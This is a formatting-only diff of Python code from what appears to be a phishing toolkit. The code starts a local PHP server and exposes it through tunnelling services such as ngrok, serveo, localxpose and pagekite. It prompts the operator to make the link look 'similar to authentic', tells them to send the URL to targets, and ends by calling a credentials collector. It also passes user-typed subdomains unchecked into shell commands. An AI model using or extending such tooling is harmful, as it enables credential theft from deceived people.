@@ -32,7 +32,8 @@ def set_php(host='127.0.0.1', port=80):
 
 
 def set_port(port=80):
-    run_background_command(["fuser", "-k", "{0}/tcp".format(port)], stdout=DEVNULL, stderr=DEVNULL)
+    run_background_command(
+        ["fuser", "-k", "{0}/tcp".format(port)], stdout=DEVNULL, stderr=DEVNULL)
 
 
 def start_server(port=80):
@@ -63,7 +64,8 @@ def start_localhost(port):
     # && php -S {0}:{1} > /dev/null 2>&1 &".format(host, port))
     enter_server_www
     set_php(host, port)
-    print(localization.lang_start_localhost["starting_server_on_addr"] + "{0}:{1}".format(host, port))
+    print(
+        localization.lang_start_localhost["starting_server_on_addr"] + "{0}:{1}".format(host, port))
     # wait(2)
     run_command('clear')
     # print('''
@@ -79,7 +81,8 @@ def start_localhost(port):
     # print("-
     # ".format(default_palette[0], default_palette[2], default_palette[3], port, host))
     print(localization.lang_start_localhost["send_this_url_suggestion"])
-    print(localization.lang_start_localhost["localhost_url"] + '{0}:{1}\n'.format(host, port))
+    print(
+        localization.lang_start_localhost["localhost_url"] + '{0}:{1}\n'.format(host, port))
 
 
 def start_ngrok(port):
@@ -117,8 +120,10 @@ def start_ngrok(port):
             #    default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
             # print("\n")
             print(localization.lang_start_ngrok["send_this_url_suggestion"])
-            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
-            print(localization.lang_start_ngrok["ngrok_url"] + url + default_palette[4])
+            print(
+                localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
+            print(
+                localization.lang_start_ngrok["ngrok_url"] + url + default_palette[4])
             break
 
 
@@ -137,7 +142,7 @@ def start_serveo(port):
         # |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         # {0}http://github.com/darksecdevelopers
         # {0}** BY:DARKSEC ** \n\n-------------------------------
-        # 
+        #
         # ''')
         simple_informant.global_message()
         print(localization.lang_start_serveo["serveo_random_server"])
@@ -147,7 +152,8 @@ def start_serveo(port):
                      'localhost:{0}'.format(port), 'serveo.net', '>', 'link.url'], stdout=DEVNULL, stderr=DEVNULL)
         wait(8)
         try:
-            output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
+            output = check_output(
+                "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             # print("-\n
             # \n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}
@@ -155,8 +161,10 @@ def start_serveo(port):
             # ".format(default_palette[0], default_palette[4], default_palette[3], port) + url + "{0}".format(default_palette[4]))
             # print("\n")
             print(localization.lang_start_serveo["send_this_url_suggestion"])
-            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
-            print(localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
+            print(
+                localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
+            print(
+                localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
         except CalledProcessError:
 
             wait(4)
@@ -178,7 +186,8 @@ def start_serveo(port):
         # \n{0}Insert a custom subdomain for serveo'''.format(default_palette[0], default_palette[2]))
         simple_informant.global_message()
         print(localization.lang_start_serveo["serveo_custom_server"])
-        print(localization.lang_start_serveo["make_url_simmilar_to_real_suggestion"])
+        print(
+            localization.lang_start_serveo["make_url_simmilar_to_real_suggestion"])
         print(localization.lang_start_serveo["insert_custom_subdomain"])
 
         lnk = input(global_localization.input_line)
@@ -193,7 +202,8 @@ def start_serveo(port):
             stderr=DEVNULL)
         wait(7)
         try:
-            output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
+            output = check_output(
+                "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             run_command('clear')
             # print('''
@@ -210,8 +220,10 @@ def start_serveo(port):
             # \n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}
             # \n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(default_palette[0], default_palette[2], default_palette[3], port) + url + "{0}".format(default_palette[4]))
             print(localization.lang_start_serveo["send_this_url_suggestion"])
-            print(localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
-            print(localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
+            print(
+                localization.lang_start_localhost["localhost_url"] + '127.0.0.1:' + port)
+            print(
+                localization.lang_start_serveo["serveo_url"] + url + default_palette[4])
 
             print("\n")
 
@@ -221,7 +233,8 @@ def start_serveo(port):
             #  !! \n''')
             print(localization.lang_start_serveo["failed_to_get_domain"])
             print(localization.lang_start_serveo["suggestion_to_fix_issue"])
-            print(localization.lang_start_serveo["you_can_try_to_select_other_domain"])
+            print(
+                localization.lang_start_serveo["you_can_try_to_select_other_domain"])
             wait(4)
             run_command('clear')
             return custom(port)
@@ -243,7 +256,8 @@ def start_serveo(port):
         print(localization.lang_start_serveo["choose_type_of_url"])
 
         # print(" \n".format(default_palette[0], default_palette[2]))
-        main_runner.print_sorted_as_menu(localization.lang_start_serveo["url_types"])
+        main_runner.print_sorted_as_menu(
+            localization.lang_start_serveo["url_types"])
         choice = input(global_localization.input_line)
         run_command('clear')
         if choice == '1':
@@ -303,11 +317,14 @@ def start_localxpose(port):
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)'''.format(
             default_palette[0], default_palette[2]))
-        lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(default_palette[0], default_palette[2]))
-        run_command('./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
+        lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(
+            default_palette[0], default_palette[2]))
+        run_command(
+            './Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &' % (port, lnk))
         wait(7)
         try:
-            output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
+            output = check_output(
+                "grep -o '.\{0,0\}https.\{0,100\}' link.url", shell=True)
             url = output.decode("utf-8")
             run_command('clear')
             print('''
@@ -343,7 +360,8 @@ def start_localxpose(port):
     print(
         "\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(
             default_palette[0], default_palette[2]))
-    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0], default_palette[2]))
+    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(
+        default_palette[0], default_palette[2]))
     run_command('clear')
     if choice == '1':
 
@@ -369,7 +387,8 @@ def start_localtunnel(port, npm):
                                                                                     default_palette[2]))
     print("\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL".format(
         default_palette[0], default_palette[2]))
-    s = input('\n{0}(Localtunnel/Subdomain)> {1}'.format(default_palette[0], default_palette[2]))
+    s = input(
+        '\n{0}(Localtunnel/Subdomain)> {1}'.format(default_palette[0], default_palette[2]))
     try:
         run_command('{0}lt -p '.format('' if npm else 'Server/') +
                     port + ((' -s ' + s) if s != '' else s) + ' > link.url &')
@@ -407,7 +426,8 @@ def start_openport(port):
         run_command('openport -K && openport %s > output.txt &' % (port))
         print('{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait.'.format(default_palette[0],
                                                                                             default_palette[4]))
-        wait(20)  # Sleep time is important as the openport command takes some time to give response link.
+        # Sleep time is important as the openport command takes some time to give response link.
+        wait(20)
         run_command(
             'cat output.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep -v https://openport.io/user > openport.txt')  # Taking out the neccesary verification link from output txt file of openport (above).
         print('{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link...'.format(default_palette[0],
@@ -415,13 +435,15 @@ def start_openport(port):
         with open('openport.txt') as f:
             read_data = f.read()
             if 'openport.io/l/' in read_data:
-                print('{0}[{1}*{0}] {1}Got Activation Link...'.format(default_palette[0], default_palette[4]))
+                print(
+                    '{0}[{1}*{0}] {1}Got Activation Link...'.format(default_palette[0], default_palette[4]))
             else:
                 print('{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... '.format(default_palette[0],
                                                                                           default_palette[4]))
                 output = open('output.txt', 'r')
                 output = output.read()
-                print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(default_palette[0], default_palette[4], output))
+                print('{0}[{1}!{0}] {1}Openport Error:\n\n{2}'.format(
+                    default_palette[0], default_palette[4], output))
                 input('\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)'.format(default_palette[0],
                                                                                       default_palette[4]))
                 server_menu.server_selection(port)
@@ -502,7 +524,8 @@ def start_pagekite(port):
                 default_palette[0], default_palette[4]))
             input("\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".format(default_palette[0],
                                                                                       default_palette[4]))
-            run_command('python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
+            run_command(
+                'python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me'.format(port, subdomain))
         except KeyboardInterrupt:
             print('[!] Please Copy the Generated Link For Further Use')
             simple_informant.credentials_collector(port)
